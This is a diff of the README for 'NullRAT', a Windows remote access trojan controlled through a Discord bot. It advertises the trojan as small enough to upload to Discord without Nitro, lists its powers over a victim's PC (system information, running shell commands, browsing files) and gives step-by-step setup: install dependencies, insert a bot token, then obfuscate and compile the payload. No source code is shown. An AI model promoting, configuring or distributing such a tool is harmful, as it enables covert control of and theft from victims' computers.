@@ -1,7 +1,7 @@
 # NullRAT
 Remote Access Trojan that uses Discord as C&C
 
-One of the main things about this RAT is it will be under 8mb, so you can always upload it without nitro
+One of the main things about this RAT is, it is under 8mb, so you can upload it without nitro
 
 That's also why it doesn't have too many features compared to other Discord RATs
 
@@ -17,20 +17,20 @@ That's also why it doesn't have too many features compared to other Discord RATs
 - Get some information about their PC
 - Execute command prompt commands (Thank you Sp00p)
 - Browse around their PC, see directory contents, and much more
+
 `It's windows-only by the way; sorry :(`
 
 ## How to use:
-- Python should be installed on the PC
+- Python 3.6+ should be installed on the PC and added to path (pip folder should be added too)
 - Don't compile normally using pyinstaller, use the compiler provided
 1) [Create a Discord bot and obtain it's token](https://www.freecodecamp.org/news/create-a-discord-bot-with-python/)
 2) Download this repository as zip [unstable] / Dowload the release [stable]
 3) Execute "Install Dependencies.bat"
 4) Fill up the empty variables & bot token in RAT.py
-5) Execute "Obfuscate and compile.bat"
+5) Execute "RATCompiler.bat"
 6) That should be everything 
 
 ## Credits
 - Monst3red for inspiration
 - Sp00p64 for some commands from [his RAT](https://github.com/Sp00p64/DiscordRAT)
 - Buntii for ideas
-- NullCode
